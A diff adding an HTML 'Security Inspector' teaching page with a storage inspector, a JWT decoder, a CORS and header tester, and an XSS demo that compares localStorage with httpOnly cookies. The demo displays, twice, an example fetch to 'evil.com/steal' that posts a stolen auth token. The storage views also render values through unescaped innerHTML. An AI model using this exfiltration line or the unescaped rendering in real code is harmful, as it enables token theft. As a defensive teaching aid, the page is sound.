@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Security Inspector - Provider Search</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #e0e0e0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #1a1a2e;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        header {
+            background: linear-gradient(90deg, #16213e 0%, #0f3460 100%);
+            padding: 30px;
+            border-bottom: 3px solid #e94560;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        h1::before {
+            content: "🔐 ";
+        }
+
+        .subtitle {
+            color: #aaa;
+            font-size: 0.9em;
+        }
+
+        .tabs {
+            display: flex;
+            background: #16213e;
+            border-bottom: 2px solid #e94560;
+            overflow-x: auto;
+        }
+
+        .tab {
+            padding: 15px 25px;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            color: #aaa;
+            font-size: 0.95em;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+
+        .tab:hover {
+            background: #1a1a2e;
+            color: #e94560;
+        }
+
+        .tab.active {
+            background: #1a1a2e;
+            color: #e94560;
+            border-bottom: 3px solid #e94560;
+            margin-bottom: -2px;
+        }
+
+        .tab-content {
+            display: none;
+            padding: 30px;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #e94560;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        textarea, input {
+            width: 100%;
+            background: #0f0f1e;
+            border: 1px solid #333;
+            color: #e0e0e0;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        button {
+            background: linear-gradient(135deg, #e94560 0%, #c73a52 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.95em;
+            transition: all 0.3s;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(233, 69, 96, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .output {
+            background: #0f0f1e;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #e94560;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .storage-item {
+            background: #0f0f1e;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .storage-key {
+            color: #4fc3f7;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .storage-value {
+            color: #aed581;
+            flex: 1;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+        }
+
+        .delete-btn {
+            background: #f44336;
+            padding: 6px 12px;
+            font-size: 0.8em;
+            margin: 0;
+        }
+
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #ffc107;
+            margin-bottom: 15px;
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #28a745;
+            margin-bottom: 15px;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid #f44336;
+            margin-bottom: 15px;
+        }
+
+        .header-item {
+            display: flex;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .header-name {
+            color: #4fc3f7;
+            font-weight: bold;
+            width: 200px;
+        }
+
+        .header-value {
+            color: #aed581;
+            flex: 1;
+            word-break: break-all;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .demo-box {
+            background: #0f0f1e;
+            padding: 20px;
+            border-radius: 6px;
+            border: 2px dashed #e94560;
+        }
+
+        code {
+            background: #0f0f1e;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #4fc3f7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Security Inspector</h1>
+            <p class="subtitle">Interactive security tools for Provider Search learning module</p>
+        </header>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('storage')">📦 Storage Inspector</button>
+            <button class="tab" onclick="showTab('jwt')">🔑 JWT Decoder</button>
+            <button class="tab" onclick="showTab('cors')">🌐 CORS Tester</button>
+            <button class="tab" onclick="showTab('headers')">📋 Security Headers</button>
+            <button class="tab" onclick="showTab('xss')">⚠️ XSS Demo</button>
+        </div>
+
+        <!-- Storage Inspector Tab -->
+        <div id="storage" class="tab-content active">
+            <div class="section">
+                <h2>Browser Storage Inspector</h2>
+                <p style="margin-bottom: 20px;">Inspect and manipulate localStorage, sessionStorage, and cookies. Test how tokens are stored in different locations.</p>
+                
+                <div class="grid-2">
+                    <div>
+                        <h3 style="color: #4fc3f7; margin-bottom: 10px;">Add Storage Item</h3>
+                        <input type="text" id="storageKey" placeholder="Key (e.g., auth_token)">
+                        <input type="text" id="storageValue" placeholder="Value">
+                        <select id="storageType" style="width: 100%; margin-bottom: 10px;">
+                            <option value="localStorage">localStorage</option>
+                            <option value="sessionStorage">sessionStorage</option>
+                            <option value="cookie">Cookie</option>
+                        </select>
+                        <button onclick="addStorageItem()">Add Item</button>
+                    </div>
+                    <div>
+                        <h3 style="color: #aed581; margin-bottom: 10px;">Quick Test Tokens</h3>
+                        <button onclick="addTestToken('localStorage')">Add Test Token (localStorage)</button>
+                        <button onclick="addTestToken('sessionStorage')">Add Test Token (sessionStorage)</button>
+                        <button onclick="addTestToken('cookie')">Add Test Token (Cookie)</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>localStorage</h2>
+                <div id="localStorageList"></div>
+                <button onclick="refreshStorage()">🔄 Refresh</button>
+                <button onclick="clearStorage('localStorage')" style="background: #f44336;">Clear All localStorage</button>
+            </div>
+
+            <div class="section">
+                <h2>sessionStorage</h2>
+                <div id="sessionStorageList"></div>
+                <button onclick="refreshStorage()">🔄 Refresh</button>
+                <button onclick="clearStorage('sessionStorage')" style="background: #f44336;">Clear All sessionStorage</button>
+            </div>
+
+            <div class="section">
+                <h2>Cookies</h2>
+                <div id="cookieList"></div>
+                <button onclick="refreshStorage()">🔄 Refresh</button>
+            </div>
+        </div>
+
+        <!-- JWT Decoder Tab -->
+        <div id="jwt" class="tab-content">
+            <div class="section">
+                <h2>JWT Token Decoder</h2>
+                <p style="margin-bottom: 20px;">Paste a JWT token to decode its header and payload. Remember: JWTs are <strong>encoded</strong>, not encrypted!</p>
+                
+                <div class="warning">
+                    ⚠️ <strong>Security Note:</strong> Never put sensitive data in JWT claims. Anyone can decode and read them!
+                </div>
+
+                <textarea id="jwtInput" placeholder="Paste your JWT token here (e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...)"></textarea>
+                <button onclick="decodeJWT()">🔓 Decode JWT</button>
+                <button onclick="loadSampleJWT()">📝 Load Sample Token</button>
+
+                <div id="jwtOutput"></div>
+            </div>
+        </div>
+
+        <!-- CORS Tester Tab -->
+        <div id="cors" class="tab-content">
+            <div class="section">
+                <h2>CORS Request Tester</h2>
+                <p style="margin-bottom: 20px;">Test Cross-Origin Resource Sharing by making requests to different URLs. Watch for CORS errors in the browser console.</p>
+
+                <div class="warning">
+                    💡 <strong>Tip:</strong> Open browser DevTools (F12) → Console to see CORS error messages
+                </div>
+
+                <input type="text" id="corsUrl" placeholder="Enter URL to test (e.g., https://api.example.com/data)" value="https://jsonplaceholder.typicode.com/posts/1">
+                
+                <div style="margin: 15px 0;">
+                    <label style="color: #aaa;">Request Method:</label><br>
+                    <select id="corsMethod" style="width: 200px;">
+                        <option>GET</option>
+                        <option>POST</option>
+                        <option>PUT</option>
+                        <option>DELETE</option>
+                    </select>
+                </div>
+
+                <button onclick="testCORS()">🌐 Send Request</button>
+                <button onclick="testCORS(true)">🔒 Send with Credentials</button>
+
+                <div id="corsOutput"></div>
+            </div>
+
+            <div class="section">
+                <h2>Understanding CORS</h2>
+                <p style="line-height: 1.6;">
+                    <strong>What is CORS?</strong><br>
+                    Cross-Origin Resource Sharing is a security mechanism that allows servers to specify which origins can access their resources.<br><br>
+                    
+                    <strong>Common CORS Headers:</strong><br>
+                    • <code>Access-Control-Allow-Origin</code> - Which domains can access<br>
+                    • <code>Access-Control-Allow-Methods</code> - Allowed HTTP methods<br>
+                    • <code>Access-Control-Allow-Credentials</code> - Allow cookies/auth<br><br>
+                    
+                    <strong>Why it matters:</strong><br>
+                    Without CORS, malicious sites could make requests to APIs using your credentials and steal data.
+                </p>
+            </div>
+        </div>
+
+        <!-- Security Headers Tab -->
+        <div id="headers" class="tab-content">
+            <div class="section">
+                <h2>Security Headers Inspector</h2>
+                <p style="margin-bottom: 20px;">Check security headers on any URL. These headers protect against various attacks.</p>
+
+                <input type="text" id="headersUrl" placeholder="Enter URL to inspect" value="https://provider-search.com">
+                <button onclick="checkHeaders()">🔍 Inspect Headers</button>
+
+                <div id="headersOutput"></div>
+            </div>
+
+            <div class="section">
+                <h2>Important Security Headers</h2>
+                <div style="line-height: 1.8;">
+                    <div class="header-item">
+                        <div class="header-name">Content-Security-Policy</div>
+                        <div class="header-value">Prevents XSS by controlling resource loading</div>
+                    </div>
+                    <div class="header-item">
+                        <div class="header-name">X-Frame-Options</div>
+                        <div class="header-value">Prevents clickjacking attacks</div>
+                    </div>
+                    <div class="header-item">
+                        <div class="header-name">X-Content-Type-Options</div>
+                        <div class="header-value">Prevents MIME-sniffing attacks</div>
+                    </div>
+                    <div class="header-item">
+                        <div class="header-name">Strict-Transport-Security</div>
+                        <div class="header-value">Forces HTTPS connections (HSTS)</div>
+                    </div>
+                    <div class="header-item">
+                        <div class="header-name">X-XSS-Protection</div>
+                        <div class="header-value">Enables browser XSS filtering</div>
+                    </div>
+                    <div class="header-item">
+                        <div class="header-name">Referrer-Policy</div>
+                        <div class="header-value">Controls referrer information</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS Demo Tab -->
+        <div id="xss" class="tab-content">
+            <div class="section">
+                <h2>XSS Attack Simulation: localStorage vs httpOnly Cookies</h2>
+                
+                <div class="error">
+                    🚨 <strong>Warning:</strong> This demonstrates why localStorage is dangerous for auth tokens!
+                </div>
+
+                <div class="grid-2">
+                    <div class="demo-box">
+                        <h3 style="color: #f44336; margin-bottom: 15px;">❌ Vulnerable: localStorage</h3>
+                        <p style="margin-bottom: 15px;">JavaScript can freely read localStorage:</p>
+                        <button onclick="storeTokenLocalStorage()">Store Token in localStorage</button>
+                        <button onclick="stealFromLocalStorage()" style="background: #f44336;">🕵️ Steal Token (XSS Attack)</button>
+                        <div id="localStorageDemo" class="output" style="margin-top: 15px;"></div>
+                    </div>
+
+                    <div class="demo-box">
+                        <h3 style="color: #4caf50; margin-bottom: 15px;">✅ Secure: httpOnly Cookie</h3>
+                        <p style="margin-bottom: 15px;">JavaScript CANNOT access httpOnly cookies:</p>
+                        <button onclick="simulateHttpOnlyCookie()">Simulate httpOnly Cookie</button>
+                        <button onclick="tryStealCookie()" style="background: #f44336;">🕵️ Try Steal Token (XSS Attack)</button>
+                        <div id="cookieDemo" class="output" style="margin-top: 15px;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>Understanding the Vulnerability</h2>
+                <p style="line-height: 1.8;">
+                    <strong>The Problem:</strong><br>
+                    If an attacker injects malicious JavaScript (XSS), they can execute code like:<br>
+                    <code style="display: block; margin: 10px 0; padding: 10px;">
+                        fetch('https://evil.com/steal', {<br>
+                        &nbsp;&nbsp;method: 'POST',<br>
+                        &nbsp;&nbsp;body: localStorage.getItem('auth_token')<br>
+                        });
+                    </code>
+                    
+                    <strong>The Solution:</strong><br>
+                    • Use <code>httpOnly</code> cookies - JavaScript cannot access them<br>
+                    • Browser sends them automatically with requests<br>
+                    • Even if XSS occurs, tokens can't be stolen<br>
+                    • Combine with CSRF protection for maximum security<br><br>
+
+                    <strong>Provider Search Implementation:</strong><br>
+                    Supabase handles auth tokens securely, using a combination of approaches to minimize XSS risk while maintaining usability.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Tab Management
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Storage Inspector Functions
+        function refreshStorage() {
+            displayLocalStorage();
+            displaySessionStorage();
+            displayCookies();
+        }
+
+        function displayLocalStorage() {
+            const list = document.getElementById('localStorageList');
+            list.innerHTML = '';
+            
+            if (localStorage.length === 0) {
+                list.innerHTML = '<p style="color: #aaa;">No items in localStorage</p>';
+                return;
+            }
+
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                list.innerHTML += `
+                    <div class="storage-item">
+                        <span class="storage-key">${key}:</span>
+                        <span class="storage-value">${value}</span>
+                        <button class="delete-btn" onclick="deleteStorageItem('localStorage', '${key}')">Delete</button>
+                    </div>
+                `;
+            }
+        }
+
+        function displaySessionStorage() {
+            const list = document.getElementById('sessionStorageList');
+            list.innerHTML = '';
+            
+            if (sessionStorage.length === 0) {
+                list.innerHTML = '<p style="color: #aaa;">No items in sessionStorage</p>';
+                return;
+            }
+
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                list.innerHTML += `
+                    <div class="storage-item">
+                        <span class="storage-key">${key}:</span>
+                        <span class="storage-value">${value}</span>
+                        <button class="delete-btn" onclick="deleteStorageItem('sessionStorage', '${key}')">Delete</button>
+                    </div>
+                `;
+            }
+        }
+
+        function displayCookies() {
+            const list = document.getElementById('cookieList');
+            const cookies = document.cookie.split(';');
+            
+            if (!document.cookie) {
+                list.innerHTML = '<p style="color: #aaa;">No cookies found</p>';
+                return;
+            }
+
+            list.innerHTML = '';
+            cookies.forEach(cookie => {
+                const [key, value] = cookie.trim().split('=');
+                list.innerHTML += `
+                    <div class="storage-item">
+                        <span class="storage-key">${key}:</span>
+                        <span class="storage-value">${value}</span>
+                        <button class="delete-btn" onclick="deleteCookie('${key}')">Delete</button>
+                    </div>
+                `;
+            });
+        }
+
+        function addStorageItem() {
+            const key = document.getElementById('storageKey').value;
+            const value = document.getElementById('storageValue').value;
+            const type = document.getElementById('storageType').value;
+
+            if (!key || !value) {
+                alert('Please enter both key and value');
+                return;
+            }
+
+            if (type === 'localStorage') {
+                localStorage.setItem(key, value);
+            } else if (type === 'sessionStorage') {
+                sessionStorage.setItem(key, value);
+            } else if (type === 'cookie') {
+                document.cookie = `${key}=${value}; path=/; max-age=3600`;
+            }
+
+            document.getElementById('storageKey').value = '';
+            document.getElementById('storageValue').value = '';
+            refreshStorage();
+        }
+
+        function addTestToken(type) {
+            const testToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJUZXN0IFVzZXIiLCJpYXQiOjE3MDk0NzQxMjB9.test_signature';
+            
+            if (type === 'localStorage') {
+                localStorage.setItem('test_auth_token', testToken);
+            } else if (type === 'sessionStorage') {
+                sessionStorage.setItem('test_auth_token', testToken);
+            } else if (type === 'cookie') {
+                document.cookie = `test_auth_token=${testToken}; path=/; max-age=3600`;
+            }
+            
+            refreshStorage();
+        }
+
+        function deleteStorageItem(type, key) {
+            if (type === 'localStorage') {
+                localStorage.removeItem(key);
+            } else if (type === 'sessionStorage') {
+                sessionStorage.removeItem(key);
+            }
+            refreshStorage();
+        }
+
+        function deleteCookie(name) {
+            document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+            refreshStorage();
+        }
+
+        function clearStorage(type) {
+            if (confirm(`Clear all ${type}?`)) {
+                if (type === 'localStorage') {
+                    localStorage.clear();
+                } else if (type === 'sessionStorage') {
+                    sessionStorage.clear();
+                }
+                refreshStorage();
+            }
+        }
+
+        // JWT Decoder Functions
+        function decodeJWT() {
+            const token = document.getElementById('jwtInput').value.trim();
+            const output = document.getElementById('jwtOutput');
+
+            if (!token) {
+                output.innerHTML = '<div class="error">Please enter a JWT token</div>';
+                return;
+            }
+
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) {
+                    throw new Error('Invalid JWT format. Expected 3 parts separated by dots.');
+                }
+
+                const header = JSON.parse(atob(parts[0]));
+                const payload = JSON.parse(atob(parts[1]));
+                const signature = parts[2];
+
+                output.innerHTML = `
+                    <div class="success">✓ JWT decoded successfully!</div>
+                    <div class="section">
+                        <h3 style="color: #4fc3f7;">Header</h3>
+                        <div class="output">${JSON.stringify(header, null, 2)}</div>
+                    </div>
+                    <div class="section">
+                        <h3 style="color: #aed581;">Payload</h3>
+                        <div class="output">${JSON.stringify(payload, null, 2)}</div>
+                        ${payload.exp ? `<p style="margin-top: 10px; color: #aaa;">Expires: ${new Date(payload.exp * 1000).toLocaleString()}</p>` : ''}
+                        ${payload.exp && Date.now() / 1000 > payload.exp ? '<div class="error" style="margin-top: 10px;">⚠️ This token is EXPIRED</div>' : ''}
+                    </div>
+                    <div class="section">
+                        <h3 style="color: #e94560;">Signature</h3>
+                        <div class="output">${signature}</div>
+                        <p style="margin-top: 10px; color: #aaa;">Signature verification requires the secret key (server-side only)</p>
+                    </div>
+                `;
+            } catch (error) {
+                output.innerHTML = `<div class="error">❌ Error: ${error.message}</div>`;
+            }
+        }
+
+        function loadSampleJWT() {
+            document.getElementById('jwtInput').value = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMzQ1IiwibmFtZSI6IkpvaG4gRG9lIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDk0NzQxMjAsImV4cCI6MTczOTQ3NDEyMH0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk';
+        }
+
+        // CORS Tester Functions
+        async function testCORS(withCredentials = false) {
+            const url = document.getElementById('corsUrl').value;
+            const method = document.getElementById('corsMethod').value;
+            const output = document.getElementById('corsOutput');
+
+            if (!url) {
+                output.innerHTML = '<div class="error">Please enter a URL</div>';
+                return;
+            }
+
+            output.innerHTML = '<div style="color: #aaa;">Sending request...</div>';
+
+            try {
+                const options = { method };
+                if (withCredentials) {
+                    options.credentials = 'include';
+                }
+
+                const response = await fetch(url, options);
+                const data = await response.text();
+
+                output.innerHTML = `
+                    <div class="success">✓ Request successful! CORS allowed.</div>
+                    <div class="section">
+                        <h3>Response Status: ${response.status} ${response.statusText}</h3>
+                        <h3 style="margin-top: 15px;">Response Headers:</h3>
+                        <div class="output">${Array.from(response.headers.entries()).map(([k, v]) => `${k}: ${v}`).join('\n')}</div>
+                        <h3 style="margin-top: 15px;">Response Body (truncated):</h3>
+                        <div class="output">${data.substring(0, 500)}${data.length > 500 ? '...' : ''}</div>
+                    </div>
+                `;
+            } catch (error) {
+                output.innerHTML = `
+                    <div class="error">❌ CORS Error: ${error.message}</div>
+                    <div class="section">
+                        <p>This usually means:</p>
+                        <ul style="margin-left: 20px; line-height: 1.8;">
+                            <li>The server doesn't allow requests from this origin</li>
+                            <li>The server doesn't have CORS headers configured</li>
+                            <li>The request requires credentials but server doesn't allow them</li>
+                        </ul>
+                        <p style="margin-top: 15px;">Check the browser console (F12) for detailed error messages.</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Security Headers Functions
+        async function checkHeaders() {
+            const url = document.getElementById('headersUrl').value;
+            const output = document.getElementById('headersOutput');
+
+            if (!url) {
+                output.innerHTML = '<div class="error">Please enter a URL</div>';
+                return;
+            }
+
+            output.innerHTML = '<div style="color: #aaa;">Fetching headers...</div>';
+
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                
+                const securityHeaders = {
+                    'content-security-policy': '🔒 CSP',
+                    'x-frame-options': '🖼️ Frame Options',
+                    'x-content-type-options': '📄 Content Type',
+                    'strict-transport-security': '🔐 HSTS',
+                    'x-xss-protection': '⚠️ XSS Protection',
+                    'referrer-policy': '🔗 Referrer Policy'
+                };
+
+                let headerHTML = '<div class="section"><h3>Security Headers Found:</h3>';
+                let foundCount = 0;
+
+                for (const [header, label] of Object.entries(securityHeaders)) {
+                    const value = response.headers.get(header);
+                    if (value) {
+                        foundCount++;
+                        headerHTML += `<div class="header-item"><div class="header-name">${label}</div><div class="header-value">${value}</div></div>`;
+                    }
+                }
+
+                if (foundCount === 0) {
+                    headerHTML += '<p style="color: #f44336;">⚠️ No security headers found!</p>';
+                } else {
+                    headerHTML = `<div class="success">✓ Found ${foundCount} security header(s)</div>` + headerHTML;
+                }
+
+                headerHTML += '</div>';
+                output.innerHTML = headerHTML;
+
+            } catch (error) {
+                output.innerHTML = `<div class="error">❌ Error: ${error.message}<br><br>Note: Due to CORS restrictions, this may not work for all URLs. Try checking headers using browser DevTools instead.</div>`;
+            }
+        }
+
+        // XSS Demo Functions
+        function storeTokenLocalStorage() {
+            const token = 'secret_jwt_token_abc123xyz789_very_sensitive';
+            localStorage.setItem('auth_token', token);
+            document.getElementById('localStorageDemo').innerHTML = `
+<span style="color: #4caf50;">✓ Token stored in localStorage</span>
+
+localStorage.auth_token = "${token}"
+
+This token is now accessible to ANY JavaScript code!
+            `;
+        }
+
+        function stealFromLocalStorage() {
+            const token = localStorage.getItem('auth_token');
+            document.getElementById('localStorageDemo').innerHTML = `
+<span style="color: #f44336;">🚨 TOKEN STOLEN!</span>
+
+Attacker's XSS code:
+const stolen = localStorage.getItem('auth_token');
+fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: stolen
+});
+
+Stolen token: ${token || '(no token found - store one first)'}
+
+<span style="color: #ff9800;">This is why localStorage is DANGEROUS for auth tokens!</span>
+            `;
+        }
+
+        function simulateHttpOnlyCookie() {
+            document.getElementById('cookieDemo').innerHTML = `
+<span style="color: #4caf50;">✓ Token would be stored in httpOnly cookie</span>
+
+Server sets cookie:
+Set-Cookie: auth_token=secret_jwt_token; HttpOnly; Secure; SameSite=Strict
+
+Note: JavaScript CANNOT set httpOnly cookies
+(only the server can via Set-Cookie header)
+
+The browser stores it securely and sends it automatically with requests.
+            `;
+        }
+
+        function tryStealCookie() {
+            document.getElementById('cookieDemo').innerHTML = `
+<span style="color: #4caf50;">✅ ATTACK BLOCKED!</span>
+
+Attacker tries:
+const stolen = document.cookie; // Returns empty or other cookies
+
+Result: httpOnly cookies are NOT accessible to JavaScript!
+
+document.cookie = "${document.cookie || '(empty)'}"
+
+<span style="color: #4caf50;">Even with XSS, the auth token remains safe! 🛡️</span>
+
+Note: Real httpOnly cookies can't be seen here because they're not
+set by this page. But in production, JavaScript simply cannot access them.
+            `;
+        }
+
+        // Initialize
+        refreshStorage();
+    </script>
+</body>
+</html>
